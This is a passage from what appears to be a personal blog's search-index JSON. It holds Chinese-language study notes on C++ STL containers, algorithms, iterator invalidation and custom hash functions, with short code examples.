s1.c_str());\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#string_view--string","title":"<code>string_view == string</code>","text":"<p>c++ - c++17 Ambiguity when compare string_view with string - Stack Overflow \u95ee\u9898\uff1astring_view\u548cstring\u90fd\u80fd\u8f6c\u6362\u6210\u5bf9\u65b9\uff0c\u4ee5\u4e0b\u4ee3\u7801\u662f\u5426\u6709\u6b67\u4e49 <pre><code>std::string s1 = \"123\";\nstd::string_view s2 = \"123\";\n// in the following comparison, will s1 use the convert operator to generate a string_view, or will s2 use string's string_view constructor to generate a string?\nif (s1 == s2) {...}\n</code></pre> - string\u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3astring_view - <code>==</code>\u64cd\u4f5c\u7b26\u6709\u4e00\u4e2aoverride\u7248\u672c\uff0c\u652f\u6301\u53c2\u6570\u9690\u5f0f\u8f6c\u6362\u4e3astring_view - \u56e0\u6b64<code>s1==s2</code>\u65f6\u4f7f\u7528string_view</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#map--set","title":"map &amp; set","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#lower_boud","title":"lower_boud","text":"<p>\u53ef\u4ee5\u7528\u4e8e\u67e5\u627emap\u4e2d\u6700\u63a5\u8fd1x\u7684\u5143\u7d20 <pre><code>auto it = s.lower_bound(num);\nint right = *it;\nint left = *(--it);  // it-1\u662f\u4e0d\u884c\u7684\uff0cit\u662f\u53cc\u5411\u8fed\u4ee3\u5668\uff0c\u4e0d\u652f\u6301 it+i/it-i\u64cd\u4f5c\n</code></pre> - \u6ce8\u610f\u662f<code>s.lower_bound</code>\u4e0d\u662f<code>lower_bound(s.begin(), s.end())</code>   - \u4e00\u6b21oj\u4e2d\u53d1\u73b0\u540e\u8005\u53ef\u4ee5\u8fd0\u884c\uff0c\u4f46\u662f\u4f1a\u8d85\u65f6</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u63d2\u5165\u5143\u7d20","title":"\u63d2\u5165\u5143\u7d20","text":"<p><pre><code>pair&lt;iterator,bool&gt; insert (const value_type&amp; val);\ntemplate &lt;class P&gt; pair&lt;iterator,bool&gt; insert (P&amp;&amp; val);\n</code></pre> - \u8fd4\u56de\u503c\uff1aret.first\u4e3a\u63d2\u5165\u5143\u7d20\u7684\u8fed\u4ee3\u5668\u3002ret.second\u6307\u793a\u5143\u7d20\u662f\u5426\u5b58\u5728</p> <pre><code>  //\u63d2\u5165\n  mymap.insert ( std::pair&lt;char,int&gt;('a',100) );\n  mymap.insert ( std::pair&lt;char,int&gt;('z',200) );\n\n  //\u8fd4\u56de\u503c\n  std::pair&lt;std::map&lt;char,int&gt;::iterator,bool&gt; ret;\n  ret = mymap.insert ( std::pair&lt;char,int&gt;('z',500) );\n  if (ret.second==false) {\n    std::cout &lt;&lt; \"element 'z' already existed\";\n    std::cout &lt;&lt; \" with a value of \" &lt;&lt; ret.first-&gt;second &lt;&lt; '\\n';\n  }\n\n  //\u4f7f\u7528[]\u63d2\u5165\uff0c\u5f53key\u4e0d\u5b58\u5728\u65f6\u4f1a\u81ea\u52a8\u521b\u5efa\u5143\u7d20\n  mapped_type&amp; operator[] (const key_type&amp; k)\n  //\u7b49\u4ef7\u4e8e\u5982\u4e0b\u8c03\u7528\n  (\n      *( //*iterator\n          (//pair&lt;iterator,bool&gt;\n              this-&gt;insert(make_pair(k, mapped_type()))\n          ).first\n      )\n  );\n\n  std::map&lt;char,std::string&gt; mymap;\n\n  mymap['a']=\"an element\";\n  mymap['b']=\"another element\";\n  mymap['c']=mymap['b'];\n  cout &lt;&lt; \"mymap['d'] is \" &lt;&lt; mymap['d']  // \u7a7a\uff0c\u5bf9\u4e8eint mapped_type\uff0c\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\n\n  //\u4f7f\u7528at()\u6765\u4fee\u6539\u5143\u7d20\uff0c\u5f53\u4e0d\u5b58\u5728\u65f6\u4f1a\u62a5\u9519\n  mapped_type&amp; at (const key_type&amp; k)\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u67e5\u627e_1","title":"\u67e5\u627e","text":"<pre><code>if (myset.count(x)) {\n   // x is in the set, count is 1\n} else {\n   // count zero, i.e. x not in the set\n}\n</code></pre> <pre><code>set&lt; X &gt;::iterator it = myset.find(x);\nif (it != myset.end()) {\n   // do something with *it\n}\n</code></pre> <p>c++ 20</p> <pre><code>if (myset.contains(x)) {\n  // x is in the set\n} else {\n  // no x \n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6c42\u4ea4","title":"\u6c42\u4ea4","text":"<p>\u590d\u6742\u5230\u8fd8\u4e0d\u5982\u4e0d\u7528 <pre><code>it=std::set_intersection (first, first+5, second, second+5, v.begin());\nv.resize(it-v.begin());\n</code></pre> c++ - How to find the intersection of two STL sets? - Stack Overflow</p> <p>I would like to understand why such a fundamental operation on sets requires such an arcanely verbose incantation.</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u81ea\u5b9a\u4e49key\u7c7b\u578b","title":"\u81ea\u5b9a\u4e49Key\u7c7b\u578b","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#map","title":"map","text":"<ul> <li>\u6709\u5e8fmap\uff0c\u9700\u8981\u81ea\u5b9a\u4e49&lt;\u8fd0\u7b97</li> <li>\u6ce8\u610f\u51fd\u6570\u9700\u8981\u58f0\u660e\u4e3aconst <pre><code>typedef struct Key{\n    char cnt[26];\n    Key(){\n        for(int i=0; i&lt;26; i++){\n            cnt[i] = 0;\n        }\n    }\n    bool operator&lt;(const Key &amp;k2) const{\n        for(int i=0; i&lt;26; i++){\n            if(cnt[i]&lt;k2.cnt[i]){\n                return true;\n            }else if(cnt[i]&gt;k2.cnt[i]){\n                return false;\n            }\n        }\n        return false;\n    }\n}Key;\n</code></pre></li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#unordered_map","title":"unordered_map","text":"<p>hash - C++ unordered_map using a custom class type as the key - Stack Overflow - \u9700\u8981\u81ea\u5b9a\u4e49\uff1a1\uff09hash\u51fd\u6570\uff0c2\uff09\u91cd\u8f7d<code>==</code>\u8fd0\u7b97 - \u5b9a\u4e49\u65f6\u9700\u8981\u5728\u6a21\u677f\u53c2\u6570\u4e2d\u5b9a\u4e49hash\u51fd\u6570\u7684\u7c7b\u578b\uff0c\u5e76\u4e14\u4f20\u9012\u5b9e\u53c2\uff08\u51fd\u6570\u5bf9\u8c61\uff0clambda\uff0c\u51fd\u6570\u540d\uff09 <pre><code>// \u81ea\u5b9a\u4e49\u5bf9 array&lt;int, 26&gt; \u7c7b\u578b\u7684\u54c8\u5e0c\u51fd\u6570\n        auto arrayHash = [fn = hash&lt;int&gt;{}] (const array&lt;int, 26&gt;&amp; arr) -&gt; size_t {\n            return accumulate(arr.begin(), arr.end(), 0u, [&amp;](size_t acc, int num) {\n                return (acc &lt;&lt; 1) ^ fn(num);\n            });\n        };\n\n        unordered_map&lt;array&lt;int, 26&gt;, vector&lt;string&gt;, decltype(arrayHash)&gt; mp(0, arrayHash);\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#queue","title":"queue","text":"<ul> <li>\u548cstack\u4e00\u6837\uff0c\u4e5f\u53ea\u6709push, pop</li> <li>\u4f46\u662f\u53ef\u4ee5\u8bbf\u95ee\u4e24\u5934\u3002front, back\u3002</li> <li>push\u5bf9\u5e94back\uff0cpop\u5bf9\u5e94front\u3002\u8003\u8651\u4e00\u4e2a\u6c34\u5e73\u653e\u7f6e\u7684\u7fbd\u6bdb\u7403\u7b52\uff0c\u4ece\u53f3\u5f80\u5de6\u653e\u5165\u7fbd\u6bdb\u7403\u3002push(back), pop(front)</li> </ul> <pre><code>front # pop value\nback # push value\npush/emplace\npop\n</code></pre> <p>queues are implemented as\u00a0containers adaptors, which are classes that use an encapsulated object of a specific container class as its\u00a0underlying container <pre><code>template &lt;class T, class Container = deque&lt;T&gt; &gt; class queue;\n</code></pre></p> <p>\u5e95\u5c42\u5bb9\u5668\u81f3\u5c11\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u65b9\u6cd5 - empty - size - front - back - push_back - pop_front The standard container classes\u00a0deque\u00a0and\u00a0list\u00a0fulfill these requirements</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#list-deque","title":"list, deque","text":"<p><code>std::list</code>\u00a0is a container that supports constant time insertion and removal of elements from anywhere in the container. Fast random access is not supported. It is usually implemented as a doubly-linked list.</p> <p>deque - \u548cvector\u7c7b\u4f3c\uff0c\u652f\u6301\u968f\u673a\u8bfb\u5199\uff0c\u5e76\u4e14\u652f\u6301\u5728\u4e24\u5934\u63d2\u5165\u5220\u9664\u3002 - \u5e95\u5c42\u4e00\u822c\u4e5f\u662f\u57fa\u4e8earray</p> <p>While vectors use a single array that needs to be occasionally reallocated for growth, the elements of a deque can be scattered in different chunks of storage, with the container keeping the necessary information internally to provide direct access to any of its elements in constant time and with a uniform sequential interface (through iterators).</p> <p>deque\u53ef\u4ee5\u4fbf\u904d\u5386\uff0c\u4f46\u662fqueue\u65e0\u6cd5\u904d\u5386</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5143\u7ec4","title":"\u5143\u7ec4","text":"<ol> <li><code>std::make_tuple</code>: \u6784\u9020\u5143\u7ec4</li> <li><code>std::get</code>: \u83b7\u5f97\u5143\u7ec4\u67d0\u4e2a\u4f4d\u7f6e\u7684\u503c</li> <li><code>std::tie</code>: \u5143\u7ec4\u62c6\u5305 <pre><code>auto student = std::make_tuple(3.8, 'A', \"\u5f20\u4e09\");\n\ncout &lt;&lt; \"\u59d3\u540d: \" &lt;&lt; std::get&lt;2&gt;(student);\n\ndouble gpa;  \nchar grade;  \nstd::string name;\n // \u5143\u7ec4\u8fdb\u884c\u62c6\u5305\nstd::tie(gpa, grade, name) = get_student(1);\n</code></pre></li> </ol>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4f18\u5148\u961f\u5217","title":"\u4f18\u5148\u961f\u5217","text":"<p>\u793a\u4f8b <pre><code>int findKthLargest(vector&lt;int&gt;&amp; nums, int k) {\n        priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; max_heap(nums.begin(), nums.end());\n        int ans;\n        for(int i=0; i&lt;k; i++){\n            ans = max_heap.top();max_heap.pop();\n        }\n        return ans;\n    }\n</code></pre></p> <p>\u6a21\u677f\u7c7b\u5b9a\u4e49 <pre><code>template&lt;\n    class T,\n    class Container = std::vector&lt;T&gt;,\n    class Compare = std::less&lt;typename Container::value_type&gt;\n&gt; class priority_queue;\n</code></pre></p> <p>\u6784\u9020\u51fd\u6570 - \u5efa\u5806\u590d\u6742\u5ea6\u4e3aO(3n) - algorithm - How is make_heap in C++ implemented to have complexity of 3N? - Stack Overflow - The constructor effectively initializes the comparison and container objects and then calls algorithm\u00a0make_heap\u00a0on the range that includes all its elements before returning. - \u4e0d\u7406\u89e3\u4e3a\u4ec0\u4e48\u6784\u9020\u51fd\u6570\u4e2d\u8fd8\u8981\u6307\u5b9acomp\u548cctnr\uff0c\u540e\u9762\u793a\u4f8b\u4e2d\u4e5f\u6ca1\u6709\u4f20\u9012\u8be5\u53c2\u6570\u554a\uff1f   - The template parameter is the\u00a0type\u00a0of the comparator. You still need to pass an\u00a0instance\u00a0of the comparator to the priority_queue constructor, and that is when you can construct the comparator instance with whatever parameters you like.Priority Queue of custom Class using Comparator with argument on constructor in C++ - Stack Overflow <pre><code>priority_queue (const Compare&amp; comp, const Container&amp; ctnr);\n\ntemplate &lt;class InputIterator&gt;  priority_queue (InputIterator first, InputIterator last,                  const Compare&amp; comp, const Container&amp; ctnr);\n</code></pre></p> <p>\u793a\u4f8b <pre><code>int myints[]= {10,60,50,20};\n\nstd::priority_queue&lt;int&gt; first;\nstd::priority_queue&lt;int&gt; second (myints,myints+4);\nstd::priority_queue&lt;int, std::vector&lt;int&gt;, std::greater&lt;int&gt; &gt;   #\u4f7f\u7528\u6700\u5c0f\u5806\uff0c\u6307\u5b9agreater\n                          third (myints,myints+4);\n</code></pre></p> <p>\u81ea\u5b9a\u4e49\u6bd4\u8f83\u51fd\u6570 <pre><code>auto cmp = [&amp;](const pair&lt;int, int&gt;&amp; x, const pair&lt;int, int&gt;&amp; y) {\n            return arr[x.first] * arr[y.second] &gt; arr[x.second] * arr[y.first];\n        };\n        priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, decltype(cmp)&gt; q(cmp);\n</code></pre></p> <ul> <li>\u5b9e\u73b0\u4e3a\u5bb9\u5668\u9002\u914d\u5668\uff0c\u5e95\u5c42\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7279\u5b9a\u7684\u5bb9\u5668\u7c7b\u5bf9\u8c61\u3002\u5e95\u5c42\u5bb9\u5668\u53ef\u4ee5\u4f7f\u7528vector\u548cdeque\uff0c\u9ed8\u8ba4\u4e3avector</li> <li>top + pop</li> <li>\u603b\u7ed3\uff1a\u4e24\u5934\u7684\u4f7f\u7528front + push\uff08queue,deque\uff09\u3002\u4e00\u5934\u7684\u4f7f\u7528top + pop\uff08stack, prority\uff09</li> </ul> <p>\u5e95\u5c42\u81ea\u52a8\u4f7f\u7528make_heap</p> <p>The standard container adaptor\u00a0priority_queue\u00a0calls\u00a0make_heap,\u00a0push_heap\u00a0and\u00a0pop_heap\u00a0automatically to maintain\u00a0heap properties\u00a0for a container.</p> <p>\u76f4\u63a5\u4f7f\u7528make_heap\u63a5\u53e3\u4f8b\u5b50 <pre><code>int myints[] = {10,20,30,5,15};\n  std::vector&lt;int&gt; v(myints,myints+5);\n\n  std::make_heap (v.begin(),v.end());\n  std::cout &lt;&lt; \"initial max heap   : \" &lt;&lt; v.front() &lt;&lt; '\\n';\n\n  std::pop_heap (v.begin(),v.end()); v.pop_back();\n  std::cout &lt;&lt; \"max heap after pop : \" &lt;&lt; v.front() &lt;&lt; '\\n';\n\n  v.push_back(99); std::push_heap (v.begin(),v.end());\n  std::cout &lt;&lt; \"max heap after push: \" &lt;&lt; v.front() &lt;&lt; '\\n';\n\n  std::sort_heap (v.begin(),v.end());\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7f3a\u9677","title":"\u7f3a\u9677","text":"<p>\u65e0\u6cd5\u5224\u65ad\u4e00\u4e2a\u5143\u7d20\u662f\u5426\u4f4d\u4e8e\u4f18\u5148\u961f\u5217\u4e2d</p> <p>\u65e0\u6cd5\u904d\u5386\uff1ac++ - How to iterate over a priority_queue? - Stack Overflow - \u771f\u591fsb\u7684</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7b97\u6cd5","title":"\u7b97\u6cd5","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6700\u5927\u6700\u5c0f","title":"\u6700\u5927\u6700\u5c0f","text":"<pre><code>*std::min_element(res.begin(), res.end())\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#find_if","title":"find_if","text":"<p>std::find, std::find_if, std::find_if_not - cppreference.com <pre><code>template&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0T\u00a0&gt;  \nInputIt find(\u00a0InputIt first, InputIt last,\u00a0const\u00a0T&amp;\u00a0value\u00a0);\n\ntemplate&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nInputIt find_if(\u00a0InputIt first, InputIt last, UnaryPredicate p\u00a0);\n\ntemplate&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nInputIt find_if_not(\u00a0InputIt first, InputIt last, UnaryPredicate q\u00a0);\n</code></pre></p> <p>\u5b9e\u73b0 <pre><code>template&lt;class InputIt, class UnaryPredicate&gt;\nconstexpr InputIt find_if(InputIt first, InputIt last, UnaryPredicate p)\n{\n    for (; first != last; ++first)\n        if (p(*first))\n            return first;\n\u00a0\n    return last;\n}\n</code></pre></p> <p>\u4f8b\u5b50 <pre><code>    int n1 = 3;\n    int n2 = 5;\n    auto is_even = [](int i) { return i % 2 == 0; };\n\u00a0\n    auto result1 = std::find(begin(v), end(v), n1);\n    auto result2 = std::find(begin(v), end(v), n2);\n    auto result3 = std::find_if(begin(v), end(v), is_even);\n\u00a0\n    //check if result == end(v)\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#any_of-none_of","title":"any_of, none_of","text":"<p>std::all_of, std::any_of, std::none_of - cppreference.com <pre><code>template&lt;\u00a0class\u00a0InputIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nbool\u00a0all_of(\u00a0InputIt first, InputIt last, UnaryPredicate p\u00a0);\n\ntemplate&lt;\u00a0class\u00a0ExecutionPolicy,\u00a0class\u00a0ForwardIt,\u00a0class\u00a0UnaryPredicate\u00a0&gt;  \nbool\u00a0all_of(\u00a0ExecutionPolicy&amp;&amp;\u00a0policy, ForwardIt first, ForwardIt last,  \n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0UnaryPredicate p\u00a0);\n</code></pre></p> <ul> <li>all_of: Checks if unary predicate\u00a0p\u00a0returns\u00a0true\u00a0for all elements in the range\u00a0<code>[</code>first<code>,</code>\u00a0last<code>)</code>.</li> <li>any_of: Checks if unary predicate\u00a0p\u00a0returns\u00a0true\u00a0for at least one element in the range\u00a0<code>[</code>first<code>,</code>\u00a0last<code>)</code>.</li> <li>none_of: Checks if unary predicate\u00a0p\u00a0returns\u00a0true\u00a0for no elements in the range\u00a0<code>[</code>first<code>,</code>\u00a0last<code>)</code>.</li> </ul> <pre><code>\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#iota","title":"iota","text":"<p>itoa\u662f\u7b2c\u4e5d\u4e2a\u5e0c\u814a\u5b57\u6bcd\u7684\u97f3\u6807\uff0c\u8868\u793a\u5c0f\u5199\u5b57\u6bcd\\(\\iota\\)\uff08\u53ef\u4ee5\u770blatex\u662f\u5982\u4f55\u5199\u7684\uff09</p> <p>\u6e90\u81eaAPL\u7f16\u7a0b\u8bed\u8a00\uff0c\u7b26\u53f7itoa\u8868\u793a\u6574\u6570\u5411\u91cf c++ - What does iota of std::iota stand for? - Stack Overflow</p> <p>The\u00a0interval vector \u2373j(n) is defined as the vector of integers beginning with\u00a0j. <pre><code>template&lt;class ForwardIt, class T&gt;\nconstexpr // since C++20\nvoid iota(ForwardIt first, ForwardIt last, T value)\n{\n    while (first != last)\n    {\n        *first++ = value;\n        ++value;\n    }\n}\n</code></pre></p> <pre><code>std::iota(l.begin(), l.end(), 0);  //\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#fill","title":"fill","text":"<pre><code>void\u00a0fill(\u00a0ForwardIt first, ForwardIt last,\u00a0const\u00a0T&amp;\u00a0value\u00a0);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u5668","title":"\u8fed\u4ee3\u5668","text":"<ul> <li>\u524d\u5411\u8fed\u4ee3\u5668\uff08forward iterator\uff09</li> <li><code>++p\uff0cp++\uff0c*p</code></li> <li>\u53cc\u5411\u8fed\u4ee3\u5668\uff08bidirectional iterator\uff09</li> <li><code>--p, p--</code></li> <li>\u968f\u673a\u8bbf\u95ee\u8fed\u4ee3\u5668\uff08random access iterator\uff09</li> <li><code>p+i, p-i, p[i]</code></li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u9002\u914d\u5668","title":"\u8fed\u4ee3\u9002\u914d\u5668","text":"<p>\u53cd\u5411\u8fed\u4ee3\u5668 \u63d2\u5165\u8fed\u4ee3\u5668</p> <p>advance(it, n)\uff1ait \u8868\u793a\u67d0\u4e2a\u8fed\u4ee3\u5668\uff0cn \u4e3a\u6574\u6570\u3002\u8be5\u51fd\u6570\u7684\u529f\u80fd\u662f\u5c06 it \u8fed\u4ee3\u5668\u524d\u8fdb\u6216\u540e\u9000 n \u4e2a\u4f4d\u7f6e\u3002 prev(it)\uff1ait \u4e3a\u6307\u5b9a\u7684\u8fed\u4ee3\u5668\uff0c\u8be5\u51fd\u6570\u9ed8\u8ba4\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u5904\u7684\u8fed\u4ee3\u5668\u3002\u6ce8\u610f\uff0cit \u81f3\u5c11\u4e3a\u53cc\u5411\u8fed\u4ee3\u5668\u3002 next(it)\uff1at \u4e3a\u6307\u5b9a\u7684\u8fed\u4ee3\u5668\uff0c\u8be5\u51fd\u6570\u9ed8\u8ba4\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u5904\u7684\u8fed\u4ee3\u5668\u3002\u6ce8\u610f\uff0cit \u6700\u5c11\u4e3a\u524d\u5411\u8fed\u4ee3\u5668\u3002 \u6ce8\u610fadvance\u4fee\u6539\u539f\u8fed\u4ee3\u5668\uff0cprev,next\u8fd4\u56de\u65b0\u8fed\u4ee3\u5668\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u5668\u5931\u6548\u5904\u7406","title":"\u8fed\u4ee3\u5668\u5931\u6548\u5904\u7406","text":"<p>STL\u5bb9\u5668\u8fed\u4ee3\u5668\u5931\u6548\u60c5\u51b5\u5206\u6790\u3001\u603b\u7ed3 | Ivanzz (ivanzz1001.github.io)</p> <p>vector\u5e95\u5c42\u662f\u8fde\u7eed\u6570\u7ec4\uff0c\u5220\u9664\u67d0\u4e2a\u5143\u7d20\u65f6\uff0c\u9700\u8981\u5bf9\u5143\u7d20\u8fdb\u884c\u79fb\u52a8\uff0c\u6b64\u65f6\u5220\u9664\u5143\u7d20\u540e\u9762\u7684\u8fed\u4ee3\u5668\u5747\u4f1a\u5931\u6548\u3002 - \u5f53\u4f7f\u7528\u4e00\u4e2a\u5bb9\u5668\u7684insert\u6216\u8005erase\u51fd\u6570\u901a\u8fc7\u8fed\u4ee3\u5668<code>\u63d2\u5165</code>\u6216<code>\u5220\u9664</code>\u5143\u7d20\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8fed\u4ee3\u5668\u5931\u6548\uff0c\u56e0\u6b64\u6211\u4eec\u4e3a\u4e86\u907f\u514d\u5371\u9669\uff0c\u5e94\u8be5\u83b7\u53d6insert\u6216\u8005erase\u8fd4\u56de\u7684\u8fed\u4ee3\u5668\uff0c\u4ee5\u4fbf\u7528\u91cd\u65b0\u83b7\u53d6\u7684\u65b0\u7684\u6709\u6548\u7684\u8fed\u4ee3\u5668\u8fdb\u884c\u6b63\u786e\u7684\u64cd\u4f5c - \u4ee5\u4e0b\u4ee3\u7801\u5b9e\u73b0\u5bf9\u6392\u5e8f\u7684\u6570\u7ec4\u53bb\u91cd\u3002 <pre><code>int removeDuplicates(vector&lt;int&gt;&amp; nums) {\n        for (auto it = nums.begin()+1; it != nums.end();) {\n            if (*it == *(it - 1)) {\n                it = nums.erase(it);\n            }else{\n                it++;\n            }\n        }\n        return nums.size();\n    }\n</code></pre></p> <ul> <li>list\uff1aerase\u65f6\u53ea\u6709\u5220\u9664\u7684\u5143\u7d20\u8fed\u4ee3\u5668\u5931\u6548\uff0c\u5176\u4f59\u4ecd\u7136\u6709\u6548\u3002</li> <li>deque\uff1a\u9996\u5c3e\u63d2\u5165\u5220\u9664\u6ca1\u5173\u7cfb\u3002\u4f46\u662f\u4e2d\u95f4\u63d2\u5165\u5220\u9664\u4f7f\u5f97\u6240\u6709\u8fed\u4ee3\u5668\u5931\u6548</li> <li>set, map\uff1a\u4e0d\u5f71\u54cd\u5176\u5b83\u5143\u7d20</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u6742","title":"\u6742","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8ba1\u65f6","title":"\u8ba1\u65f6","text":"<p>Date and time utilities - cppreference.com</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u95ee\u9898_1","title":"\u95ee\u9898","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u8fed\u4ee3\u5668\u8fb9\u904d\u5386\u8fb9\u5220\u9664","title":"\u8fed\u4ee3\u5668\u8fb9\u904d\u5386\u8fb9\u5220\u9664","text":"<p>c++ - Deleting elements from std::set while iterating - Stack Overflow</p> <pre><code>erase(it);\nit++  //\u9519\u8bef\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2acurrent\u5b58\u50a8\u5f53\u524d\u503c <pre><code>for (auto it = unvisit.begin(); it != unvisit.end();) {\n    auto cur = it++;\n    int y = *cur;\n    if (gcd(x, y) &gt; 1) {\n        s.push(y);\n        unvisit.erase(cur);\n    }\n}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u89c1\u53d6\u6574","title":"\u5e38\u89c1\u53d6\u6574","text":"<ul> <li>std::floor(x)  == (int) ?</li> <li>std::ceil(x)\u5982\u4f55\u5b9e\u73b0</li> <li>\u5176\u5b9efloat\u8f6cint\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462\uff1f\u6709\u4e13\u95e8\u6307\u4ee4\u5417\uff1f</li> </ul> <p>c++ - Ceil function: how can we implement it ourselves? - Stack Overflow - \u6839\u636eIEEE754\u6807\u51c6\u5b9e\u73b0 - if(x == (int) x)</p> <p>\u5b9e\u9645 - SSE, AVX \u4e13\u95e8\u7684\u4e00\u7c7bCVT\u6307\u4ee4 https://db.in.tum.de/~finis/x86-intrin-cheatsheet-v2.1.pdf</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#hash-map\u4f7f\u7528pair\u4f5c\u4e3akey","title":"hash map\u4f7f\u7528pair\u4f5c\u4e3akey","text":"<p>c++ - Why can't I compile an unordered_map with a pair as key? - Stack Overflow</p> <p>\u5bf9\u4e8e\u975e\u57fa\u672c\u7c7b\u578bkey\u7684hash map\uff0cc++\u8981\u6c42\u81ea\u5b9a\u4e49hash\u51fd\u6570</p> <p>\u4e24\u79cd\u65b9\u6cd5\uff1a - wrap\u4e00\u4e2a\u9488\u5bf9\u4e00\u822cpair\u7c7b\u578b\u7684hash\u51fd\u6570   - \u8fd9\u6837\u4e0d\u80fd\u5b8c\u5168\u4fdd\u8bc1hash\u51fd\u6570\u662f\u6bd4\u8f83\u597d\u7684 <pre><code>// Only for pairs of std::hash-able types for simplicity.\n// You can of course template this struct to allow other hash functions\nstruct pair_hash {\n    template &lt;class T1, class T2&gt;\n    std::size_t operator () (const std::pair&lt;T1,T2&gt; &amp;p) const {\n        auto h1 = std::hash&lt;T1&gt;{}(p.first);\n        auto h2 = std::hash&lt;T2&gt;{}(p.second);\n\n        // Mainly for demonstration purposes, i.e. works but is overly simple\n        // In the real world, use sth. like boost.hash_combine\n        return h1 ^ h2;  \n    }\n};\n\nunordered_map&lt;pair&lt;int, int&gt;, int, pair_hash&gt; memo; //(S, i) -&gt; #permutation\n</code></pre> - \u81ea\u5df1wrap\u4e00\u4e2a\u751f\u6210key\u7684\u51fd\u6570\u3002   - \u8fd9\u6837\u4f7f\u7528\u7684\u662f\u7cfb\u7edf\u7684hash\u51fd\u6570\uff0c\u6548\u679c\u6709\u4fdd\u969c   - \u9700\u8981\u4fdd\u8bc1\u751f\u6210\u7684key\u662f\u552f\u4e00\u7684\u3002 <pre><code>inline size_t get_key(int i, int j) {\n    return (size_t)i &lt;&lt; 32 | (unsigned int)j;\n}\n\nunordered_map&lt;size_t, int&gt; memo;\n\nauto key = get_key(S, prev);\nif(memo.count(key)){\n    return 